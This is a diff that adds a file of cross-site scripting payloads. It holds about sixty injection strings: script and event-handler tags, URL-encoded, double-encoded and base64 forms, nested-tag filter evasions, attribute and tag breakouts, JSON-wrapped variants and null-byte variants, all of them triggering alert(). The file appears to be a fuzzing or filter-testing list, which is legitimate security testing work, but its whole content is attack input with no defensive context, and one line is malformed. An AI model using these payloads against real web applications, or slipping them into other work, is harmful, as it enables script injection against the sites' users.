@@ -1,0 +1,64 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<body onload=alert(1)>
+<video src onerror=alert(1)>
+<details open ontoggle=alert(1)></details>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>XSS</marquee>
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E
+%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E
+%253Csvg%2520onload%253Dalert(1)%253E
+%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+%253Ciframe%2520src%253Djavascript%253Aalert%281%29%253E%253C%252Fiframe%253E
+PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==
+PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKQ==
+PGJyIG9ubG9hZD1hbGVydCgnWFNTJyk+
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<svg><scr<script>ipt>alert(1)</scr<script>ipt></svg>
+<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+<scr/*anything*/ipt>alert(1)</scr/*anything*/ipt>
+<scr<script src="data:text/javascript,alert(1)">ipt>
+" onmouseover="alert(1)"
+' onerror=alert(1) #
+"><script>alert(1)</script>
+"><svg/onload=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><svg onload=alert(1)>
+<!--"></script><script>alert(1)//-->
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><marquee onstart=alert(1)>
+"><details open ontoggle=alert(1)>
+alert(String.fromCharCode(88,83,83))
+windowt(1)')
+setTimeout('alert(1)', 0)
+Function('alert(1)')()
+<svg/onload=alert`1`>
+<svg/onload=alert'1'>
+<svg/onload=alert"1">
+<svg/onload=alert&#40;1&#41;>
+{"key": "<img src=x onerror=alert(1)>"}
+{"key": "</script><script>alert(1)</script>"}
+{"key": "<svg/onload=alert(1)>"}
+<svg\x00onload=alert(1)>
+<img src=x\x00onerror=alert(1)>
+"><img src=x\x00onerror=alert(1)>
+"><svg\x00onload=alert(1)>
+<keygen onfocus=alert(1) autofocus>
+<progress value=100 max=100 onmouseover=alert(1)>
+<meter onmouseover=alert(1) min=0 max=100 value=50></meter>
+<output onfocus=alert(1) tabindex=0>Click me</output>
+document.write('<script>alert(1)</script>');
+location.href = "javascript:alert(1)";
+document.body.innerHTML = '<img src=x onerror=alert(1)>';
+<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>
+<math><mtext><title><img src=x onerror=alert(1)></title></mtext></math>
+
